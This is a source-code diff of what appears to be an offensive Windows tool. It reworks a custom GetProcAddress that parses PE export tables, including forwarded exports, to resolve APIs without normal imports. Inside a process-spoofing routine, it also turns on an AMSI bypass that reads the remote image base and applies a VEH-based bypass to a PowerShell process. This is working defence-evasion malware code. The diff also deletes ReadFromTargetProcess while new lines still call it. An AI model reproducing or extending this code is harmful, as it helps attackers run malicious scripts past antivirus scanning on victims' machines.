@@ -184,66 +184,63 @@ HMODULE CustomGetModuleHandleW(LPCWSTR moduleName){
 }
 
 FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
-    PBYTE pBase = (PBYTE) hModule;
-
-    //Cast DOS header
+    PBYTE pBase = (PBYTE)hModule;
     PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
-    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE){
-        //printf("[-] Erreur de recuperation du DOS Header\n");
-		return NULL;
-    }
+    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
 
-    //Get NTHeader ptr from DOS header
     PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
-	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
-		//printf("[-] Erreur de recuperation du NtHeader\n");
-        return NULL;
-    }
+    IMAGE_DATA_DIRECTORY exportDirInfo = pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (exportDirInfo.VirtualAddress == 0) return NULL;
 
-    //Get Optionalheader for NTHeader
-    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
-    //get _IMAGE_EXPORT_DIRECTORY addr from opt hdr
-    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-
+    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportDirInfo.VirtualAddress);
     PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
     PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
-    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
+    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
 
-    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){
+    for (DWORD i = 0; i < pImgExportDir->NumberOfNames; i++) {
         CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
+        
         if (strcmp(lpProcName, pFunctionName) == 0) {
             WORD wFunctionOrdinal = FunctionOrdinalArray[i];
-            PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[wFunctionOrdinal]);
-            return (FARPROC)pFunctionAddress;
+            DWORD dwFunctionRVA = FunctionAddressArray[wFunctionOrdinal];
+
+            // Test de Forwarding : l'adresse pointe dans la section d'export elle-même
+            if (dwFunctionRVA >= exportDirInfo.VirtualAddress && 
+                dwFunctionRVA < (exportDirInfo.VirtualAddress + exportDirInfo.Size)) {
+                
+                CHAR szForwarder[256];
+                strcpy_s(szForwarder, (CHAR*)(pBase + dwFunctionRVA));
+
+                CHAR* pDot = strchr(szForwarder, '.');
+                if (!pDot) return NULL;
+
+                *pDot = '\0';
+                CHAR* pRealFuncName = pDot + 1;
+
+                // Conversion ANSI (du forwarder) vers WideChar pour votre CustomGetModuleHandleW
+                WCHAR wszForwarderDll[MAX_PATH];
+                size_t convertedChars = 0;
+                mbstowcs_s(&convertedChars, wszForwarderDll, MAX_PATH, szForwarder, _TRUNCATE);
+                
+                // Ajout de l'extension .dll si absente (certains forwarders l'omettent)
+                if (wcsstr(wszForwarderDll, L".dll") == NULL && wcsstr(wszForwarderDll, L".DLL") == NULL) {
+                    wcscat_s(wszForwarderDll, MAX_PATH, L".dll");
+                }
+
+                HMODULE hForwardDll = CustomGetModuleHandleW(wszForwarderDll);
+                
+                // Si le module n'est pas chargé, on utilise LoadLibraryW (standard) 
+                // ou votre propre implémentation de mapping.
+                if (!hForwardDll) hForwardDll = LoadLibraryW(wszForwarderDll);
+                if (!hForwardDll) return NULL;
+
+                return CustomGetProcAddress(hForwardDll, pRealFuncName);
+            }
+
+            return (FARPROC)(pBase + dwFunctionRVA);
         }
     }
     return NULL;
-}
-
-LPCWSTR ConvertDataToLPCWSTR(BYTE* Data) {
-    if (!Data) return NULL;
-    int dataSize = MultiByteToWideChar(CP_UTF8, 0, (LPCSTR)Data, -1, NULL, 0);
-    LPWSTR dataW = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dataSize * sizeof(WCHAR));
-    if (dataW) {
-        MultiByteToWideChar(CP_UTF8, 0, (LPCSTR)Data, -1, dataW, dataSize);
-    }
-    return (LPCWSTR)dataW;
-}
-
-BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN SIZE_T dwBufferSize) {
-    HANDLE hHeap = GetProcessHeap();
-    *ppReadBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBufferSize);
-    
-    if (*ppReadBuffer == NULL) return FALSE;
-
-    SIZE_T sNmbrOfBytesRead = 0;
-    if (!WrapperReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead)) {
-        printf("[!] ReadProcessMemory Failed : %u\n", GetLastError());
-        HeapFree(hHeap, 0, *ppReadBuffer);
-        *ppReadBuffer = NULL;
-        return FALSE;
-    }
-    return TRUE;
 }
 
 BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN SIZE_T dwBufferSize) {
@@ -421,7 +418,10 @@ HANDLE CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, L
     printf("[*] Applying VEH squared AMSI Bypass via APC queued PIC stubs...\n");
     printf("[!] Well no, it bypasses only the main thread of powershell, but it's still a really good demo of the technique !\n");
     printf("[!] The things is that it's an othert clr thread that loads AMSI and not the main thread, so we would need to apply the bypass on all threads of the process to be really effective, \n but that's a bit more work to do in C ad i don't know how to do that..!\n");
-    //ApplyVehBypass(Pi->hProcess, Pi->hThread);
+    
+    PVOID pRemoteImageBase = NULL;
+    ReadFromTargetProcess(Pi->hProcess, PBI.PebBaseAddress + 0x10 /* ImageBaseAddress */, &pRemoteImageBase, sizeof(PVOID));
+    ApplyVehBypass(Pi->hProcess, Pi->hThread, pRemoteImageBase);
 
 
 cleanup:
